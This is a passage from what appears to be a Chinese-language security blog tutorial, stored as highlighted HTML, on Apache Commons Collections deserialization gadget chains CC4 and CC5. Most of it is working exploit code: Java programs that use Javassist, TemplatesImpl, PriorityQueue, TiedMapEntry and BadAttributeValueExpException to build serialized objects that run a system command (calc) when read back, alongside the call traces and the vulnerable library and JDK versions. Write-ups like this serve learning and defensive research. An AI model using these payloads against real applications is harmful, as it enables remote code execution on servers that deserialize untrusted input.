class="token punctuation">)</span><span class="token punctuation">;</span>        _bytecode<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> targetByteCode<span class="token punctuation">)</span><span class="token punctuation">;</span>        _tfactory<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> templates<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="CC4链"><a href="#CC4链" class="headerlink" title="CC4链"></a>CC4链</h2><p>CC4链是在CC2链的基础上，利用<code>InstantiateTransformer</code>替换<code>InvokerTransformer</code>得到的。</p><h3 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h3><p>CC4的调用链（脑测）</p><pre class=" language-1"><code class="language-1">/*    Gadget chain:        ObjectInputStream.readObject()            PriorityQueue.readObject()                ...                    TransformingComparator.compare()                        ChaindTransformer.transform()                            ConstantTransformer.transform()                                InstantiateTransformer.transform()                                    new TrAXFilter(templatesImpl)                                        templatesImpl.newTransformer() */</code></pre><p>自己试着copy了一下</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> javassist<span class="token punctuation">.</span>ClassPool<span class="token punctuation">;</span><span class="token keyword">import</span> javassist<span class="token punctuation">.</span>CtClass<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>Transformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>comparators<span class="token punctuation">.</span>TransformingComparator<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ChainedTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ConstantTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>InstantiateTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>InvokerTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span>Templates<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>PriorityQueue<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">cc4</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        String AbstractTranslet<span class="token operator">=</span><span class="token string">"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"</span><span class="token punctuation">;</span>        String TemplatesImpl<span class="token operator">=</span><span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span><span class="token punctuation">;</span>        ClassPool classPool<span class="token operator">=</span>ClassPool<span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        classPool<span class="token punctuation">.</span><span class="token function">appendClassPath</span><span class="token punctuation">(</span>AbstractTranslet<span class="token punctuation">)</span><span class="token punctuation">;</span>        CtClass payload<span class="token operator">=</span>classPool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"CC2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        payload<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>classPool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>AbstractTranslet<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        payload<span class="token punctuation">.</span><span class="token function">makeClassInitializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setBody</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime.getRuntime().exec(\"calc\");"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes<span class="token operator">=</span>payload<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//转换为byte数组</span>        Object templatesImpl<span class="token operator">=</span>Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>TemplatesImpl<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Field field<span class="token operator">=</span>templatesImpl<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_bytecodes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//暴力反射</span>        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>bytes<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Field field1<span class="token operator">=</span>templatesImpl<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        field1<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//暴力反射</span>        field1<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//接下来只需templatesImpl.newTransformer()</span>        <span class="token comment" spellcheck="true">//制作chain</span>        Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> transformers<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>TrAXFilter<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InstantiateTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>Templates<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>templatesImpl<span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        ChainedTransformer chain<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        TransformingComparator comparator <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">TransformingComparator</span><span class="token punctuation">(</span>chain<span class="token punctuation">)</span><span class="token punctuation">;</span>        PriorityQueue queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Field field2<span class="token operator">=</span>queue<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"comparator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        field2<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        field2<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>queue<span class="token punctuation">,</span>comparator<span class="token punctuation">)</span><span class="token punctuation">;</span>        Field field3<span class="token operator">=</span>queue<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"queue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        field3<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        field3<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>queue<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>templatesImpl<span class="token punctuation">,</span>templatesImpl<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectOutputStream outputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"test.out"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        outputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token punctuation">;</span>        outputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectInputStream inputStream<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"test.out"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        inputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>可以成功调用计算器。</p><h2 id="CC5链"><a href="#CC5链" class="headerlink" title="CC5链"></a>CC5链</h2><h3 id="调用链-1"><a href="#调用链-1" class="headerlink" title="调用链"></a>调用链</h3><pre class=" language-1"><code class="language-1">Gadget chain:    ObjectInputStream.readObject()        BadAttributeValueExpException.readObject()            TiedMapEntry.toString()                LazyMap.get()                    ChainedTransformer.transform()                        ConstantTransformer.transform()                        InvokerTransformer.transform()                            Method.invoke()                                Class.getMethod()                        InvokerTransformer.transform()                            Method.invoke()                                Runtime.getRuntime()                        InvokerTransformer.transform()                            Method.invoke()                                 Runtime.exec()</code></pre><h3 id="环境版本"><a href="#环境版本" class="headerlink" title="环境版本"></a>环境版本</h3><p>JDK&lt;8u76</p><pre class=" language-1"><code class="language-1"><dependency>   <groupId>commons-collections</groupId>   <artifactId>commons-collections</artifactId>   <version>3.1</version></dependency></code></pre><h3 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h3><p>看一下</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TiedMapEntry</span> <span class="token keyword">implements</span> <span class="token class-name">Entry</span><span class="token punctuation">,</span> KeyValue<span class="token punctuation">,</span> Serializable <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> <span class="token operator">-</span>8453869361373831205L<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">final</span> Map map<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">final</span> Object key<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">TiedMapEntry</span><span class="token punctuation">(</span>Map map<span class="token punctuation">,</span> Object key<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>map <span class="token operator">=</span> map<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>key <span class="token operator">=</span> key<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> Object <span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>key<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> Object <span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> Object <span class="token function">setValue</span><span class="token punctuation">(</span>Object value<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">==</span> <span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"Cannot set value to this map entry"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">equals</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>obj <span class="token operator">==</span> <span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>obj <span class="token keyword">instanceof</span> <span class="token class-name">Entry</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            Entry other <span class="token operator">=</span> <span class="token punctuation">(</span>Entry<span class="token punctuation">)</span>obj<span class="token punctuation">;</span>            Object value <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>key <span class="token operator">==</span> null <span class="token operator">?</span> other<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> null <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>key<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>other<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>value <span class="token operator">==</span> null <span class="token operator">?</span> other<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> null <span class="token operator">:</span> value<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>other<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        Object value <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> null <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>value <span class="token operator">==</span> null <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> value<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"="</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>我们可以看到在<code>toString()</code>函数中有调用<code>getValue()</code>方法，<code>getValue()</code>方法中又调用<code>this.map.get()</code>如果我们让<code>this.map</code>为<code>lazyMap</code>，就可以调用<code>lazyMap.get()</code>。与CC1链成功联系。<br>接下来想如何触发<code>toString</code>方法。</p><h3 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" title="BadAttributeValueExpException"></a>BadAttributeValueExpException</h3><p>在<code>BadAttributeValueExpException.readObject()</code>中有</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span>ObjectInputStream ois<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>        ObjectInputStream<span class="token punctuation">.</span>GetField gf <span class="token operator">=</span> ois<span class="token punctuation">.</span><span class="token function">readFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Object valObj <span class="token operator">=</span> gf<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>valObj <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            val <span class="token operator">=</span> null<span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>valObj <span class="token keyword">instanceof</span> <span class="token class-name">String</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            val<span class="token operator">=</span> valObj<span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>System<span class="token punctuation">.</span><span class="token function">getSecurityManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> null                <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Long</span>                <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Integer</span>                <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Float</span>                <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Double</span>                <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Byte</span>                <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Short</span>                <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Boolean</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            val <span class="token operator">=</span> valObj<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// the serialized object is from a version without JDK-8019292 fix</span>            val <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">identityHashCode</span><span class="token punctuation">(</span>valObj<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"@"</span> <span class="token operator">+</span> valObj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p><code>BadAttributeValueExpException.readObject()</code>有调用<code>valObj.toString()</code>。这时我们就需要进入if，于是我们考虑如何将<code>System.getSecurityManager() == null</code>还有如何将<code>valObj</code>的值赋为<code>TiedMapEntry</code>类。<br>看到<code>Object valObj = gf.get("val", null);</code>，我们将<code>val</code>进行赋值即可。<br>跟进<code>System.getSecurityManager()</code>发现<code>return security</code>，然后<code>security</code>默认为null。</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>Transformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span>TiedMapEntry<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span>LazyMap<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span>BadAttributeValueExpException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">cc5</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>        ChainedTransformer chain<span class="token operator">=</span><span class="token function">getChainedTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Map lazymap<span class="token operator">=</span>LazyMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>chain<span class="token punctuation">)</span><span class="token punctuation">;</span>        TiedMapEntry tiedMapEntry<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazymap<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        BadAttributeValueExpException e<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>        Class <span class="token class-name">c1</span><span class="token operator">=</span>e<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Field Field1<span class="token operator">=</span>c1<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Field1<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Field1<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>tiedMapEntry<span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectOutputStream objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"1.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectInputStream objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> 